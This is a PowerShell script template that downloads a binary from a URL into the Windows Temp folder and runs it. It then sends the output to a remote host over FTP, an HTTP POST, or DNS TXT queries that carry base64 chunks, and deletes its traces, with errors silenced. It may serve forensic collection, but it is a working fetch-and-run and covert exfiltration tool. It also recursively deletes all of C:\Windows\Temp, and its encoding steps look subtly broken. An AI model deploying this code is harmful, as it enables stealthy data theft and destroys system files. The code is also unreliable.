function Get-Template {
    #requires -version 2
    <#
.SYNOPSIS
  <Overview of script>
.DESCRIPTION
  <Brief description of script>
.PARAMETER <Parameter_Name>
    <Brief description of parameter input required. Repeat this attribute if required>
.INPUTS
  <Inputs if any, otherwise state None>
.OUTPUTS
  <Outputs if any, otherwise state None - example: Log file stored in C:\Windows\Temp\<name>.log>
.NOTES
  Version:        1.0
  Author:         <Name>
  Creation Date:  <Date>
  Purpose/Change: Initial script development

.EXAMPLE
  Get-Template -OutPath C:\Windows\Temp\Output -ExfilOption FTP -Binary AppCompatCacheParser.exe -Argument1 "--csv $OutPath"
  #>
    #-----------------------------------------------------------[Parameters]------------------------------------------------------------

    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $OutPath,

        [Parameter(Position = 1, Mandatory = $False, ValueFromPipeLine = $True)]
        [AllowEmptyString()]
        [String]
        $Data,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateSet("FTP", "WebServer", "DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Username,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $Password,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $URL,

        [Parameter(Position = 6, Mandatory = $False)]
        [String]
        $DomainName,

        [Parameter(Position = 7, Mandatory = $False)]
        [String]
        $AuthNS,

        [Parameter(Position = 8, Mandatory = $False)]
        [String]
        $Binary,

        [Parameter(Position = 9, Mandatory = $False)]
        [String]
        $Argument,

        [Parameter(Position = 10, Mandatory = $True)]
        [String]
        $Redirectstdout,

        [Parameter(Position = 11, Mandatory = $False)]
        [String]
        $Campaign
    )

    #---------------------------------------------------------[Initializations]-----------------------------------------------------
    # Start-Transcript -Path "$ENV:SYSTEMROOT\Temp\Template-$env:computername.Transcription" -NoClobber
    [Net.ServicePointManager]::SecurityProtocol=[Enum]::ToObject([Net.SecurityProtocolType], 3072)
    #Set Error Action to Silently Continue
    $ErrorActionPreference = "SilentlyContinue"
    #Path to directory to download support binaries too
    $Tools = "$ENV:SYSTEMROOT\Temp\"
    #Date Time format to be used in
    $a = Get-Date -Format yyyyMMdd-HHmmss
    #Support Binary path
    $supportBIN = "$ENV:SYSTEMROOT\Temp\$binary"
    #URL to support binaries. URLs are case sensitive
    $supportURL = "https://LINK/$binary"
    #Create a webclient
    $webclient = New-Object -TypeName System.Net.WebClient
    #Filename structure - Example: $outFileName.csv
    $outFileName = "$binary-$campaign-$a-$env:computername"

    #-----------------------------------------------------------[Functions]--------------------------------------------------------
    function Push-FTP {
        $source = $OutPath
        $password | ConvertTo-SecureString -AsPlainText -Force
        $destination = "ftp://$Username`:$Password`@$URL"
        $files = Get-ChildItem $source

        foreach ($file in $files) {
            $webclient.UploadFile("$destination/$file", $file.FullName)
        }
        $webclient.Dispose()
    }
    function Compress-Encode {
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms, $action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $Data | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        $Compressed = [Convert]::ToBase64String($ms.ToArray())
        return $Compressed
    }
    function post_http($url, $parameters) {
        $http_request = New-Object -ComObject Msxml2.XMLHTTP
        $http_request.open("POST", $url, $false)
        $http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
        $http_request.setRequestHeader("Content-length", $parameters.length);
        $http_request.setRequestHeader("Connection", "close")
        $http_request.send($parameters)
        $script:session_key = $http_request.responseText
    }
    #---------------------------------------------------------[Setups]------------------------------------------------------------
    #Wipe and create directory for support binaries and download them, if needed.
    If (test-path "$tools") {
        Remove-Item -Force -Recurse -Path $tools
        New-Item -Name Tools -ItemType Directory -Path "$env:systemroot\Temp" -Force
        $webclient.DownloadFile($supportURL, $supportBIN)
    }
    else {
        New-Item -Name Tools -ItemType Directory -Path "$env:systemroot\Temp" -Force
        $webclient.DownloadFile($supportURL, $supportBIN)
    }
    # Wipe and create OutPath directory
    If (test-path "$OutPath") {
        Remove-Item -Force -Recurse -Path $OutPath
        New-Item -ItemType Directory -Path "$OutPath" -Force
    }
    else {
        New-Item -ItemType Directory -Path "$OutPath" -Force
    }
    #---------------------------------------------------------[Executions]-------------------------------------------------------
    if ($exfiloption -eq "webserver") {
        $process = Start-Process -FilePath $supportBIN -NoNewWindow -Wait -PassThru -ArgumentList "$Argument" -RedirectStandardOutput "$Redirectstdout"
        $Data = $process | Compress-Encode
        post_http $URL $Data
        # Remove artifact folders if it exists
        If (test-path "$tools") {Remove-Item -Force -Recurse -Path $tools}
        If (test-path "$outpath") {Remove-Item -Force -Recurse -Path $outpath}
    }

    elseif ($ExfilOption -eq "DNS") {
        $process = Start-Process -FilePath $supportBIN -NoNewWindow -Wait -PassThru -ArgumentList "$Argument" -RedirectStandardOutput "$Redirectstdout"
        $code = $process | Compress-Encode
        $queries = [int]($code.Length / 63)
        while ($queries -ne 0) {
            $querystring = $code.Substring($lengthofsubstr, 63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length % 63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
        # Remove artifact folders if it exists
        If (test-path "$tools") {Remove-Item -Force -Recurse -Path $tools}
        If (test-path "$outpath") {Remove-Item -Force -Recurse -Path $outpath}
    }

    elseif ($exfiloption -eq "ftp") {
        $process = Start-Process -FilePath $supportBIN -NoNewWindow -Wait -PassThru -ArgumentList "$Argument" -RedirectStandardOutput "$Redirectstdout" | Out-Null
        Push-FTP
        # Remove artifact folders if it exists
        If (test-path "$tools") {Remove-Item -Force -Recurse -Path $tools}
        If (test-path "$outpath") {Remove-Item -Force -Recurse -Path $outpath}
    }
    # Stop-Transcript
}
